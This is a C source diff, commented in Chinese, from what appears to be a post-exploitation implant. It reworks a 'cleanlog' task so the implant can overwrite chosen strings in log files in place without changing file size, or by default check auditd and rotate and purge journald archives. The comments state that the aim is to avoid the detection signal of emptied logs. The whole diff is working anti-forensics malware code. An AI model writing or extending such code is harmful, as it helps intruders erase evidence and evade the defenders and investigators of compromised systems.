@@ -138,23 +138,98 @@ int task_timestomp(const uint8_t *data, uint32_t len, mp_writer_t *w) {
 }
 
 // ══════════════════════════════════════════════════════════════════════
-// cleanlog — truncate system logs
-// No input params
+// cleanlog — 日志处理（P2-E 重做）
+// 可选参数（msgpack map）:
+//   path  : string  要**等长就地改写**的文件
+//   pairs : string  "needle=repl;needle=repl"
+//                   repl 不足右侧补 '0'、超长截断 → **文件大小一个字节不变**
+// 不给参数 = 默认安全清理：auditd 判定 + journald「轮转 + 清归档」；
+// **不再** truncate /var/log/*（大小归零本身是强告警信号）。
 // ══════════════════════════════════════════════════════════════════════
 
-int task_cleanlog(mp_writer_t *w) {
-    int cleaned = opsec_clean_logs();
-    if (cleaned == 0) {
-        write_error(w, "No logs truncated (requires root)");
-    } else {
-        char msg[64];
-        char num[16];
-        ax_itoa(cleaned, num, 10);
-        ax_strcpy(msg, "Truncated ");
-        ax_strcat(msg, num);
-        ax_strcat(msg, " log file(s)");
-        write_output(w, msg);
+#define AX_MAX_PAIRS 16
+
+int task_cleanlog(const uint8_t *data, uint32_t len, mp_writer_t *w) {
+    char path[256];
+    char pairs[1024];
+    path[0] = '\0';
+    pairs[0] = '\0';
+
+    if (data && len > 0) {
+        mp_reader_t r;
+        mp_reader_init(&r, data, len);
+        uint32_t mc = 0;
+        if (mp_read_map(&r, &mc) == 0) {
+            for (uint32_t i = 0; i < mc; i++) {
+                const char *key; uint32_t klen;
+                if (mp_read_str(&r, &key, &klen) != 0) break;
+                if (klen == 4 && ax_memcmp(key, "path", 4) == 0) {
+                    const char *v; uint32_t vl;
+                    if (mp_read_str(&r, &v, &vl) == 0 && vl < (uint32_t)sizeof(path)) {
+                        ax_memcpy(path, v, vl); path[vl] = '\0';
+                    }
+                } else if (klen == 5 && ax_memcmp(key, "pairs", 5) == 0) {
+                    const char *v; uint32_t vl;
+                    if (mp_read_str(&r, &v, &vl) == 0 && vl < (uint32_t)sizeof(pairs)) {
+                        ax_memcpy(pairs, v, vl); pairs[vl] = '\0';
+                    }
+                } else {
+                    mp_skip(&r);   // 未知键必须跳过，否则后续键全部错位
+                }
+            }
+        }
     }
+
+    // ── 定向等长改写（E4）──
+    if (path[0] && pairs[0]) {
+        const char *nd[AX_MAX_PAIRS];
+        const char *sb[AX_MAX_PAIRS];
+        int n = 0;
+        char *p = pairs;
+        while (*p && n < AX_MAX_PAIRS) {
+            char *semi = p;
+            while (*semi && *semi != ';') semi++;
+            int more = (*semi == ';');
+            char *eq = p;
+            while (eq < semi && *eq != '=') eq++;
+            if (eq >= semi) break;          // 这一段没有 '=' → 停
+            *eq = '\0';
+            *semi = '\0';
+            nd[n] = p;
+            sb[n] = eq + 1;
+            n++;
+            if (!more) break;
+            p = semi + 1;
+        }
+        if (n == 0) {
+            write_error(w, "cleanlog: bad pairs (want needle=repl;needle=repl)");
+            return 0;
+        }
+        int hits = opsec_redact_file(path, nd, sb, n);
+        char msg[256], num[16];
+        if (hits < 0) {
+            ax_strcpy(msg, "cleanlog: cannot open ");
+            ax_strcat(msg, path);
+            write_error(w, msg);
+        } else {
+            ax_strcpy(msg, "redacted ");
+            ax_itoa(hits, num, 10);
+            ax_strcat(msg, num);
+            ax_strcat(msg, " occurrence(s) in ");
+            ax_strcat(msg, path);
+            ax_strcat(msg, " (file size unchanged)");
+            write_output(w, msg);
+        }
+        return 0;
+    }
+
+    // ── 默认安全清理（E3 + E5）──
+    char rep[256];
+    char msg[400];
+    opsec_clean_logs(rep, (int)sizeof(rep));
+    ax_strcpy(msg, "cleanlog: ");
+    ax_strcat(msg, rep);
+    write_output(w, msg);
     return 0;
 }
 
